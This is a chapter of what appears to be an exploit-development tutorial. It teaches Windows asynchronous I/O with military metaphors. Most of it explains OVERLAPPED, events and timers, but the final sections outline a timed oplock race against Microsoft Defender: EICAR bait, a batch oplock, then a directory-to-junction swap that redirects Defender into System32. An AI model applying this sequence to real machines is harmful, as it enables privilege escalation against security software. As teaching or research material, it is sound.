# Chapter 5 — Async I/O: The Radio Receiver

## The Problem

Imagine you're standing watch at a checkpoint. Nothing is happening, but
you can't move. Can't eat. Can't check the other sectors. Can't react to
anything else in your area of operations. You're frozen at your post
until someone walks through — and you have no idea if that's in five
seconds or five hours. Your entire section is combat-ineffective because
one digger is pinned to one position doing nothing.

That's **synchronous** (blocking) I/O. Fine for a quick clearance patrol.
Absolute dogshit for waiting on external events you can't predict.

With an oplock, we're waiting for Defender to scan a file. That could
take 5ms or 30 seconds. We can't stand frozen at the checkpoint — when
the tripwire fires, we need to react in MICROSECONDS. We need to be
ready to move the instant we get contact.

**Asynchronous** (non-blocking) I/O is the answer. Instead of standing
watch yourself, you deploy a listening post with a radio receiver. You
tune the frequency, man the LP, and get called back the instant there's
contact. The operation returns immediately, and Windows signals you when
it's done.

## The OVERLAPPED Structure — The Radio Receiver

`OVERLAPPED` is the radio receiver hardware. It's the struct the kernel
uses to track your pending fire mission and signal you when the forward
observer reports contact.

```c
typedef struct _OVERLAPPED {
    ULONG_PTR Internal;        // Kernel status (don't touch)
    ULONG_PTR InternalHigh;    // Bytes transferred (don't touch)
    union {
        struct {
            DWORD Offset;      // File position (low 32 bits)
            DWORD OffsetHigh;  // File position (high 32 bits)
        };
        PVOID Pointer;
    };
    HANDLE hEvent;             // ← THIS IS WHAT WE CARE ABOUT
} OVERLAPPED;
```

The only field you set is `hEvent` — the frequency you're monitoring.
Everything else is either zeroed or managed by the kernel. You don't
strip and reassemble the whole radio. You tune the frequency and wait
for traffic.

## Events: The Signal on the Wire

A Windows **event** is a kernel object with two states:
- **Non-signaled**: silence on the net — nothing has happened yet (default)
- **Signaled**: CONTACT — something tripped

```c
// Tune the radio — create an event in non-signaled state
HANDLE hEvent = CreateEvent(
    NULL,    // No security attributes
    TRUE,    // Manual reset (stays signaled until you reset it)
    FALSE,   // Initial state: NOT signaled
    NULL     // No name (anonymous event)
);
```

This is tuning your radio frequency — installing the alarm that will
fire when signals come through.

### Manual Reset vs Auto Reset

- **Manual reset** (`TRUE`): Once the alarm fires, it stays ringing until
  you explicitly call `ResetEvent()` to silence it. Multiple sentries can
  hear the alarm.
- **Auto reset** (`FALSE`): Alarm fires once, first sentry to hear it
  silences it automatically. Everyone else sleeps through it. Only one
  digger gets the notification.

For oplocks, we use **manual reset** because we want to react exactly
once and we control the flow ourselves. One contact report, one response.

## The Async Battle Drill

Here's the full async fire-and-wait pattern we use for oplocks:

```c
// 1. Open the file with FILE_FLAG_OVERLAPPED
HANDLE hFile = CreateFileW(
    path,
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL,
    OPEN_EXISTING,
    FILE_FLAG_OVERLAPPED,    // ← enables async on this handle
    NULL
);

// 2. Create the OVERLAPPED structure with an event
OVERLAPPED ov = {0};            // Zero everything
ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

// 3. Start the async operation
BOOL result = DeviceIoControl(
    hFile,
    FSCTL_REQUEST_BATCH_OPLOCK,
    NULL, 0, NULL, 0,
    NULL,          // lpBytesReturned — not used for async
    &ov            // ← the OVERLAPPED struct
);

// 4. Check: should return FALSE with ERROR_IO_PENDING
if (!result && GetLastError() == ERROR_IO_PENDING) {
    // GOOD — LP is manned, standing by for contact
}

// 5. Wait for the operation to complete (tripwire to fire)
DWORD waitResult = WaitForSingleObject(ov.hEvent, timeoutMs);

// 6. Check what happened
switch (waitResult) {
    case WAIT_OBJECT_0:
        // CONTACT — tripwire fired! Enemy in the wire!
        // React NOW — execute the swap
        break;
    case WAIT_TIMEOUT:
        // No contact — patrol area quiet, nothing came through
        break;
    case WAIT_FAILED:
        // Comms failure
        break;
}

// 7. Clean up
CloseHandle(ov.hEvent);
CloseHandle(hFile);
```

## WaitForSingleObject: Manning the Listening Post

This is you manning the LP. You sit on the frequency, completely silent,
consuming zero resources, until the signal comes through or you're
relieved by timeout:

```c
DWORD WaitForSingleObject(
    HANDLE hHandle,      // What to wait for (an event, process, thread, etc.)
    DWORD dwMilliseconds // How long to man the LP (INFINITE = until relieved)
);
```

Return values:
- `WAIT_OBJECT_0` (0): CONTACT. The event fired. Enemy in the wire. Tripwire broke.
- `WAIT_TIMEOUT` (258): Stood down. Time expired, no contact. Patrol area quiet.
- `WAIT_FAILED` (0xFFFFFFFF): Comms failure. Radio's fucked. Call `GetLastError()`.

**INFINITE vs Timeout:**
- `INFINITE`: Man the LP until contact, no relief. Simple but dangerous —
  if nobody ever walks through the wire, your program is stuck on that
  post forever.
- Timeout (e.g., 10000 = 10 seconds): Stood down after 10 seconds if no
  contact. Returns `WAIT_TIMEOUT`. Safer. You can redeploy, clean up, or
  try a different ambush site.

In the exploit, we use a timeout. If Defender doesn't walk into the kill
zone within ~10 seconds, something's wrong (RTP might be off) and we
should abort the mission.

## Why Not Just Poll in a Loop?

```c
// DON'T DO THIS
while (!oplock_broken) {
    Sleep(1);  // Check every millisecond
}
```

This is the equivalent of constantly keying the mic and radioing HQ:
"Any contact? Any contact? Any contact?" — every millisecond, flooding
the net with pointless traffic. Three reasons this is a clusterfuck:

1. **Resolution**: `Sleep(1)` actually sleeps for 15ms on most systems
   (timer granularity). The TOCTOU window is 15-50ms. You're blinking
   between each transmission — a 15ms blind spot every cycle. The enemy
   walks through your arc while your eyes are closed.
2. **Bandwidth waste**: A polling loop burns 100% of one CPU core doing
   nothing useful. You're flooding the comms net and blocking everyone
   else from operating.
3. **Not how oplocks work**: There's no "check if broken" function.
   Nobody's answering your radio calls because that's not how the comms
   net is designed. The kernel signals the event. You MUST use
   event-based waiting.

`WaitForSingleObject` costs zero CPU while waiting. You sit quiet on
the frequency, zero noise discipline violations, and get instant
response when the signal comes — microsecond precision. That's how a
proper listening post operates. Silent. Patient. Lethal.

## QueryPerformanceCounter: The Battlefield Chronograph

We need to measure how fast Defender responds (to know our race window).
`GetTickCount()` is only accurate to ~15ms — like timing an ambush with
a wristwatch. We need microseconds.

```c
LARGE_INTEGER freq, start, end;

// Get the counter frequency (ticks per second)
QueryPerformanceFrequency(&freq);  // Usually ~10,000,000

// Start the chronograph
QueryPerformanceCounter(&start);

// ... execute the mission ...

// Stop the chronograph
QueryPerformanceCounter(&end);

// Calculate elapsed time in milliseconds
double elapsed_ms = (double)(end.QuadPart - start.QuadPart)
                    / freq.QuadPart * 1000.0;

printf("Took %.3f ms\n", elapsed_ms);
```

Sub-microsecond precision. This is your battlefield stopwatch — timing
the gap between the tripwire firing and the swap completing. When your
window of opportunity is measured in microseconds, you need a
chronograph that can measure microseconds. We use it in BB3 to measure
exactly how fast Defender's RTP responds to the EICAR bait.

## The Contact Drill — Timing the Exploit

Here's the exact fire-and-manoeuvre sequence in the real exploit:

```
Time 0ms:    Write EICAR bait to disk
Time 0ms:    Open bait with FILE_FLAG_OVERLAPPED
Time 0ms:    DeviceIoControl(FSCTL_REQUEST_BATCH_OPLOCK) → ERROR_IO_PENDING
Time 0ms:    WaitForSingleObject(event, 10000) → LP manned, standing by

             ... Defender's WdFilter.sys detects the EICAR write ...
             ... WdFilter decides to scan the file ...
             ... WdFilter tries to open the file for scanning ...
             ... NTFS sees the oplock → signals our event ...

Time ~15ms:  WaitForSingleObject returns WAIT_OBJECT_0 — CONTACT!
             CLOCK IS TICKING — we have maybe 15-50ms before
             Defender's scan thread resumes and advances on the position

Time ~15ms:  CloseHandle(oplockHandle)   // Release the file (~0.01ms)
Time ~15ms:  DeleteFile(baitFile)        // Remove the bait (~0.05ms)
Time ~15ms:  RemoveDirectory(workDir)    // Destroy the kill zone (~0.05ms)
Time ~15ms:  CreateDirectory(workDir)    // Rebuild as empty (~0.05ms)
Time ~15ms:  SetReparsePoint(workDir)    // Plant the junction (~0.1ms)

             Total swap time: <0.5ms

Time ~35ms:  Defender's scan thread resumes
             Opens the path again
             NTFS follows the junction
             Defender is now in System32 — walked straight into the ambush
```

We have ~15-50ms of margin with operations that take ~0.2ms. That's
30-250x headroom. Like having 30 seconds to cross a 1-second danger
area. The timing isn't tight — it's a firing range.

## Key Takeaways

- `FILE_FLAG_OVERLAPPED` on `CreateFile` enables async I/O — sets up the radio receiver
- `OVERLAPPED.hEvent` is the frequency you're monitoring
- `CreateEvent` tunes the radio — installs the alarm
- `WaitForSingleObject` mans the listening post — zero noise, instant response on contact
- Never poll in a loop — that's flooding the net like a nervous private keying the mic. Use event-based waiting
- `QueryPerformanceCounter` is your battlefield chronograph — microsecond precision timing
- The async battle drill: deploy LP → get "roger, standing by" → wait for contact → react

## Test Program

Compile and run `TESTS/test05_async.c` to see async I/O and events
in action without any oplock complexity.
